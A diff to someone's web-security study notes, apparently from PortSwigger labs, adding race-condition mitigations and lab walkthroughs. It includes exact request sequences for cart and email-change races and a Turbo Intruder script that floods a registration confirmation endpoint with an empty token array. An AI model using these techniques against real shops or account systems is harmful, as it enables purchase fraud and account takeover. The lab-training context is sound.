@@ -999,6 +999,14 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 - HTTP/1: last-byte synchronization technique
 - HTTP/2: single-packet attack technique, (Using a single TCP packet to complete 20-30 requests simultaneously)
 
+**Mitigation**
+- Using database transactions can ensure that state changes are atomic, which means they either fully complete or don't happen at all
+- Locks can prevent multiple processes from accessing the same resource simultaneously   
+- Ensure that operations can be performed multiple times without changing the result (API Idempotency)
+- Use Message Queues. Decouple processes by using message queues. This ensures that operations are processed sequentially
+- Avoid mixing data from different storage places. If you're fetching user details from a database and payment information from an external API, it's better to first fetch and cache the data from the external API, then operate on the cached data alongside your database transaction
+- Avoid server-side state entirely. Store state in a JWT and ensure it's encrypted and signed to prevent tampering. 
+
 ### Race Condition Lab
 - Limit overrun race conditions
   - For 20% off use code at checkout: **PROMO20**
@@ -1038,13 +1046,53 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
     - start attack > observe 302 response code   
 - Multi-endpoint race conditions
   - create tab group
-    - add gift card: POST /cart productId=2&redir=PRODUCT&quantity=1
-    - check out: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
-    - add jacket: POST /cart productId=1&redir=PRODUCT&quantity=1
+    - **add gift card**: POST /cart productId=2&redir=PRODUCT&quantity=1
+    - **check out**: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
+    - **add jacket**: POST /cart productId=1&redir=PRODUCT&quantity=1
   - under check out tab > send group (parallel)
 - Single-endpoint race conditions   
-- ddd
-- ddd
+  - **POST /my-account/change-email**   
+    - request 1: anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net   
+    - request 2: carlos@ginandjuice.shop   
+  - send the requests in parallel   
+  - Receive email of carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.   
+- Partial construction race conditions
+  - **POST /register**   
+    csrf=CRs0ranHwII63CbQnp32ZGxCEKavBZcO&username=`%s`&email=user%40ginandjuice.shop&password=123456
+  - **send to turbbo intruder**
+    ```python
+    def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+    Host: 0ac7000204681544819facc200310057.web-security-academy.net
+    Cookie: phpsessionid=NzQYwl5AGYNLGU50kB1QxFMfV54fXskz
+    Content-Length: 0
+    '''  
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = 'hacks' + currentAttempt
+    
+        # queue a single registration request
+        engine.queue(target.req, username, gate=currentAttempt)
+        
+        # queue 50 confirmation requests - note that this will probably sent in two separate packets
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+        
+        # send all the queued requests for this attempt
+        engine.openGate(currentAttempt)
+
+    def handleResponse(req, interesting):
+       table.add(req)
+
+    username=User0&email=user%40ginandjuice.shop&password=123456
+    ```
+- Exploiting time-sensitive vulnerabilities   
 
 ## SSRF (Server-Side Request Forgery)
 Content for SSRF...
